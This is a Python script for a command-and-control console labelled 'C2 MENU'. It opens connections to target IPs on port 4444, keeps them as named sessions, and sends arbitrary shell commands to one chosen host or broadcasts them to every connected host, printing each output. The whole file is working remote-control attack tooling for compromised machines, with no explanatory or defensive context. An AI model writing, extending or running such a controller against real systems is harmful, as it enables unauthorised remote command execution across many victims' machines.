import socket
import threading
import time

PORT = 4444  # Fixed port
connections = {}  # { session_id: {'name': str, 'conn': socket.socket, 'addr': (ip, port)} }
session_counter = 1
lock = threading.Lock()

def add_connection():
    global session_counter
    name = input("Enter connection name: ")
    ip = input("Enter target IP: ")
    print(f"[*] Trying to connect to {ip}:{PORT}...")
    
    try:
        s = socket.socket()
        s.connect((ip, PORT))
        
        with lock:
            connections[session_counter] = {'name': name, 'conn': s, 'addr': (ip, PORT)}
            print(f"[+] Connection '{name}' added as session {session_counter}")
            session_counter += 1
        time.sleep(1)
    except Exception as e:
        print(f"[!] Failed to connect: {e}")
        time.sleep(1)

def show_connections():
    if not connections:
        print("[!] No active connections.")
        time.sleep(1)
        return
    print("\nActive Connections:")
    for sid, info in connections.items():
        print(f"  [{sid}] {info['name']} @ {info['addr'][0]}:{info['addr'][1]}")
    time.sleep(1)

def interact_session():
    sid = input("Enter session ID to interact with (or type 'session' to list, 'back' to return): ")
    if sid == "session":
        list_sessions()
        return
    if sid == "back":
        return
    try:
        sid = int(sid)
        if sid not in connections:
            print("[!] Invalid session ID.")
            time.sleep(1)
            return
        conn = connections[sid]['conn']
        name = connections[sid]['name']
        print(f"[~] Connected to '{name}' (session {sid})\nType 'exit' to terminate, 'bg' to background.")
        
        while True:
            cmd = input(f"{name}@session{sid}$ ")
            if cmd == "exit":
                conn.send(cmd.encode())
                conn.close()
                with lock:
                    del connections[sid]
                print(f"[x] Connection '{name}' removed.")
                time.sleep(1)
                break
            elif cmd == "bg":
                print(f"[~] Session '{name}' backgrounded.")
                time.sleep(1)
                break
            else:
                try:
                    conn.send(cmd.encode())
                    output = conn.recv(4096).decode()
                    print(output)
                except Exception as e:
                    print(f"[!] Error communicating: {e}")
                    time.sleep(1)
                    break
    except ValueError:
        print("[!] Invalid input.")
        time.sleep(1)

def broadcast():
    if not connections:
        print("[!] No active sessions.")
        time.sleep(1)
        return

    print("Broadcast to: 1. Selected Machines  2. All")
    choice = input("Enter choice: ")
    targets = []

    if choice == "1":
        list_sessions()
        selected = input("Enter session IDs separated by commas (e.g. 1,3): ")
        try:
            ids = [int(x.strip()) for x in selected.split(",")]
            for sid in ids:
                if sid in connections:
                    targets.append((sid, connections[sid]))
        except:
            print("[!] Invalid session list.")
            time.sleep(1)
            return
    elif choice == "2":
        targets = list(connections.items())
    else:
        print("[!] Invalid choice.")
        time.sleep(1)
        return

    cmd = input("Enter command to broadcast: ")
    for sid, info in targets:
        try:
            info['conn'].send(cmd.encode())
            output = info['conn'].recv(4096).decode()
            print(f"\n[Session {sid} - {info['name']}]")
            print(output)
        except Exception as e:
            print(f"[!] Failed to send to session {sid}: {e}")
    time.sleep(1)

def remove_connection():
    sid = input("Enter session ID to remove: ")
    try:
        sid = int(sid)
        if sid in connections:
            connections[sid]['conn'].close()
            del connections[sid]
            print(f"[x] Connection '{sid}' removed.")
        else:
            print("[!] Session not found.")
    except:
        print("[!] Invalid input.")
    time.sleep(1)

def list_sessions():
    print("\nSessions:")
    for sid, info in connections.items():
        print(f"  [{sid}] {info['name']} @ {info['addr'][0]}")
    time.sleep(1)

def menu():
    while True:
        print("\n=== C2 MENU ===")
        print("1. Add Connection")
        print("2. Show Connections")
        print("3. Interact with Session")
        print("4. Broadcast")
        print("5. Remove Connection")
        print("6. List Sessions")
        print("7. Exit")

        choice = input("Enter choice: ")
        if choice == "1":
            add_connection()
        elif choice == "2":
            show_connections()
        elif choice == "3":
            interact_session()
        elif choice == "4":
            broadcast()
        elif choice == "5":
            remove_connection()
        elif choice == "6":
            list_sessions()
        elif choice == "7":
            print("Exiting...")
            time.sleep(1)
            break
        else:
            print("[!] Invalid choice.")
            time.sleep(1)

if __name__ == "__main__":
    menu()
